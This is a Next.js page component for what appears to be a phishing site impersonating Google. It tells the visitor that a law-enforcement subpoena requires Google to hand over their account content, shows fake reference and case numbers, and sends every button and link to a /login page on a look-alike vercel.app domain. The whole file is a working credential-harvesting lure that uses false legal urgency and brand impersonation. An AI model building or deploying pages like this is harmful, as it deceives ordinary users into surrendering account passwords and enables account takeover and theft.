import Link from "next/link";
import Image from "next/image";

export default function Home() {
  return (
    <div className="min-h-screen flex flex-col items-center bg-white text-black">
      <header className="w-full py-3 px-5 bg-white border-b-[1px] border-gray-300">
        <Image
          src="/googlelongicon.png"
          alt="Google Logo"
          width={100}
          height={50}
          className="h-full"
        />
      </header>
      <main className="w-full mt-10 px-10 text-justify ">
        <h1 className="font-bold sm:text-3xl text-xl mb-7">
          A SUBPOENA WAS SERVED ON GOOGLE LLC REQUIRING US TO PRODUCE A COPY OF
          YOUR GOOGLE ACCOUNT CONTENT
        </h1>
        <p className="mb-5 sm:text-xl text-md">
          <strong>Google Support Ref#:</strong> [17-00000918456] Transferred to
          Legal Investigations
        </p>
        <p className="mb-5 sm:text-xl text-md">
          <Link href="/login">
            <strong>Google Support Case:</strong>{" "}
            https://google-legal-investigations.vercel.app
          </Link>
        </p>
        <p className="mb-5 sm:text-xl text-md">
          <strong>GOOGLE ACCOUNT ID:</strong> 1778307780341
        </p>
        <p className="mb-6 sm:text-xl text-md">
          This notice is to alert you that the subpoena was issued to Google LLC
          by a law enforcement that seeks retrieval of information contained in
          your Google Account.
        </p>
        <p className="mb-10 sm:text-xl text-md">
          To examine the case materials or take measures to submit a protest,
          please do so in the provided Google Support Case.
        </p>
        <div className="w-full relative mb-10">
          <div className="flex flex-col sm:flex-row sm:space-x-4 space-y-4 sm:space-y-0 justify-center">
            <Link
              href="/login"
              className="bg-blue-700 w-full sm:w-auto sm:min-w-[200px] text-white px-8 py-3 text-lg rounded-full hover:bg-blue-600 hover:shadow-md shadow-blue-500 text-center"
            >
              Upload additional documents
            </Link>
            <Link
              href="/login"
              className="bg-blue-700 w-full sm:w-auto sm:min-w-[200px] text-white px-8 py-3 text-lg rounded-full hover:bg-blue-600 hover:shadow-md shadow-blue-500 text-center"
            >
              View case
            </Link>
          </div>
        </div>
      </main>
      <footer className="mt-auto text-gray-600">
        <Link href="/login">
          <p className="w-full mb-6 text-center">Google Legal Support</p>
        </Link>
      </footer>
    </div>
  );
}
